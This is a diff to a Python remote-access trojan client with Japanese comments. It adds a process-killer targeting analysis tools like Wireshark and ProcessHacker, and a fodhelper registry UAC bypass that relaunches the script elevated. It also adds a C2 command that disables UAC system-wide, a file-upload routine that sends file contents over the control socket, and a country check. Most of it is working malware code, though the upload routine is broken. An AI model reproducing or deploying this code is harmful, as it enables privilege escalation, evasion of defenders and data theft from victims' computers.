@@ -9,9 +9,24 @@ import os
 import getpass
 import sys
 import requests
-import util
 import msgpack
 import random
+import ctypes
+import winreg
+
+CMD                   = r"C:\Windows\System32\cmd.exe"
+FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
+PYTHON_CMD            = "python"
+REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
+DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+
+PROCNAMES = [
+    "ProcessHacker.exe",
+    "httpdebuggerui.exe",
+    "wireshark.exe",
+    "fiddler.exe",
+    "regedit.exe",
+]
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -20,6 +35,48 @@ base_user_agents = [
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
 ]
+
+def antidebug():
+    for proc in psutil.process_iter():
+        if proc.name() in PROCNAMES:
+            proc.kill()
+
+def is_running_as_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+    
+def create_reg_key(key, value):
+    try:        
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
+        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
+        winreg.CloseKey(registry_key)
+    except WindowsError:        
+        raise
+
+def bypass_uac(cmd):
+    try:
+        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
+        create_reg_key(None, cmd)    
+    except WindowsError:
+        raise
+    
+def execute():
+    antidebug()       
+    if not is_running_as_admin():
+        try:                
+            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
+            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
+            bypass_uac(cmd)                
+            os.system(FOD_HELPER)                
+            main()    
+        except WindowsError:
+            print("error!")
+            sys.exit(1)
+    else:
+        print("DD")    
 
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
@@ -75,7 +132,7 @@ def check_country_code():
         
         # 国コードを取得する
         country_code = response.text.strip()
-        allowed_countries = {'RU', 'BY', 'KP', 'CN', 'JP'}
+        allowed_countries = {'RU', 'BY', 'KP', 'CN', 'JP'} #　ロシア、ベラルーシ、北朝鮮、中国
         
         # 国コードが許可されたものでない場合、プログラムを終了する
         if country_code not in allowed_countries:
@@ -88,7 +145,7 @@ def get_system_info():
     return {
         "hostname": platform.node(),
         "username": platform.uname().node,
-        "global_ip": requests.get('https://ifconfig.me').text,  # ここではダミーのIPアドレスを使用します。本番ではグローバルIPを取得してください。
+        "global_ip": requests.get('https://ifconfig.me').text,
         "os_name": platform.system(),
         "os_version": platform.version(),
         "cpu_usage": psutil.cpu_percent(),
@@ -112,7 +169,11 @@ def send_periodic_updates(s, session_id, system_info):
 def dataproc(data):
     return msgpack.unpackb(bytes.fromhex(data))
 
-
+def upload_file(s ,file):
+    with open(file) as f:
+        a = f.readall()
+        b = b.hex()
+        s.sendall(b.encode('utf-8'))
     
     
 
@@ -123,7 +184,6 @@ def receive_messages(s, session_id):
             data = s.recv(1024)
             if data:
                 message = data.decode().strip()
-                print(f"Received from server: {message}")
                 
                 # "all:" で始まるメッセージを処理
                 if message.startswith("all:"):
@@ -160,17 +220,17 @@ def receive_messages(s, session_id):
                         
                     # 例: 特定のコマンドを実行するなど
                     continue
+                
+                decoded_message = dataproc(message)
 
                 # クライアント個別のメッセージを処理
-                if message == "exit":
+                if decoded_message[0] == "exit":
                     print("Exiting as per server's instruction.")
                     s.close()
                     os._exit(0)
                     break
-                if message == "persist":
-                    a = util.persist()
                     
-                if message == "DisableUAC":
+                if decoded_message[0] == "DisableUAC":
                     os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
 
         except ConnectionResetError:
@@ -199,4 +259,4 @@ def main():
         send_periodic_updates(s, session_id, system_info)
 
 if __name__ == "__main__":
-    main()
+    execute()
